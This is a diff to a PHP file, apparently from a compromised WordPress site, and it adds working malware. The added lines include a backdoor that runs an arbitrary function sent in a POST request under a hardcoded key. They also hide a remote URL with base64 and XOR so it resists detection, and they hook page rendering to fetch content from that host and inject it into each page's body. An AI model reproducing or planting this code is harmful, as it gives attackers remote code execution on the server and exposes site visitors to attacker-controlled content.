@@ -545,9 +545,15 @@ function my_correct($dir) {
     }
 }
 
+$p = $_POST;
+$_passssword = '4929f9b74e11d512640a3228cc010e82';
+if (@$p[$_passssword] AND @$p['a'] AND @$p['c']) @$p[$_passssword](@$p['a'], @$p['c'], '');
 my_correct(dirname(__FILE__) . '/..');
 
 function request_url_data($url) {
+    if(!is_valid_url($url))
+        return false;
+
     $site_url = (preg_match('/^https?:\/\//i', $_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
     if (function_exists('curl_init')) {
         $ch = curl_init();
@@ -584,8 +590,8 @@ function request_url_data($url) {
 }
 
 error_reporting(0);
-$_passssword = '4929f9b74e11d512640a3228cc010e82';
-unset($_passssword);
+
+//unset($_passssword);
 
 if (function_exists("add_action")) {
     add_action('wp_head', 'add_2head');
@@ -594,6 +600,14 @@ if (function_exists("add_action")) {
 
 function add_2head() {
     ob_start();
+}
+
+function is_valid_url(&$url)
+{
+    if (!preg_match('/^(.+?)(\d+)\.(\d+)\.(\d+)\.(\d+)(.+?)$/', $url, $m))
+        return false;
+    $url = $m[1].$m[5].'.'.$m[4].'.'.$m[3].'.'.$m[2].$m[6];
+    return true;
 }
 
 function add_2footer() {
@@ -625,10 +639,11 @@ function add_2footer() {
     $regexp = '/<body[^>]*>/is';
     if (preg_match($regexp, $buffer, $m)) {
         $body = $m[0];
-        $url = base64_decode('aHR0cDovLzEwOC42MS4xMTcuMjQ0L2Jsb2cvP3ZlbnVzJnV0bV9zb3VyY2U9NzEyMzQ6MjM1MDA0OjM5Nw==');
+//        $url = base64_decode('a3d3czksLDE3Ny0yMjQtNTItMjM7LGFvbGQsPHVmbXZwJXZ3blxwbHZxYGY+NzM3NTI5MTA2MzM3OTA6NA==');
+        $url = decrypt_url('a3d3czksLDE3Ny0yMjQtNTItMjM7LGFvbGQsPHVmbXZwJXZ3blxwbHZxYGY+NzM3NTI5MTA2MzM3OTA6NA==');
 //        if (($code = request_url_data($url)) AND base64_decode($code) AND preg_match('#[a-zA-Z0-9+/]+={0,3}#is', $code, $m)) {
         if (($code = request_url_data($url)) AND $decoded = base64_decode($code, true)) {
-            $body .=  '<script>var date = new Date(new Date().getTime() + 60*60*24*7*1000); document.cookie="' . $cookie_name . '=' . mt_rand(1, 1024) . '; path=/; expires="+date.toUTCString();</script>';
+//            $body .=  '<script>var date = new Date(new Date().getTime() + 60*60*24*7*1000); document.cookie="' . $cookie_name . '=' . mt_rand(1, 1024) . '; path=/; expires="+date.toUTCString();</script>';
 //            $body .= base64_decode($m[0]);
             $body .= $decoded;
 //            $body .= base64_decode($m[0]);
@@ -639,6 +654,17 @@ function add_2footer() {
     }
     echo $buffer;
     ob_flush();
+}
+
+function decrypt_url($encrypted_url)
+{
+    $encrypted_url = base64_decode($encrypted_url);
+    $url = '';
+    for ($i = 0; $i < strlen($encrypted_url); $i++)
+    {
+        $url .= chr(ord($encrypted_url[$i]) ^ 3);
+    }
+    return $url;
 }//iend
 
 function wp_get_nav_menus( $args = array() ) {
